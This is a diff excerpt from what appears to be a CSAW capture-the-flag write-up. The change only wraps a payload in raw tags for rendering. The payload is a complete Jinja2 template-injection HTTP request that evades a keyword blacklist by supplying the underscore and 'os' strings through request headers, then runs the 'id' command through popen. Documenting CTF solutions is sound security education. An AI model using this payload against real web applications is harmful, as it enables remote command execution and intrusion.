@@ -6,7 +6,7 @@ Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCM
 
 * Final Payload to bypass the keyword check with headers
 ```
-GET /submit?value={{request|attr('application')|attr((request.headers.score*2,'globals',request.headers.score*2)|join)|attr((request.headers.score*2,'getitem',request.headers.score*2)|join)((request.headers.score*2,'builtins',request.headers.score*2)|join)|attr((request.headers.score*2,'getitem',request.headers.score*2)|join)((request.headers.score*2,request.headers.imp,request.headers.score*2)|join)(request.headers.bypass)|attr('popen')('id')|attr('read')()}} HTTP/1.1
+GET /submit?value={% raw %}{{request|attr('application')|attr((request.headers.score*2,'globals',request.headers.score*2)|join)|attr((request.headers.score*2,'getitem',request.headers.score*2)|join)((request.headers.score*2,'builtins',request.headers.score*2)|join)|attr((request.headers.score*2,'getitem',request.headers.score*2)|join)((request.headers.score*2,request.headers.imp,request.headers.score*2)|join)(request.headers.bypass)|attr('popen')('id')|attr('read')()}}{% endraw %} HTTP/1.1
 Host: web.chal.csaw.io:5000
 Bypass: os
 Score: _
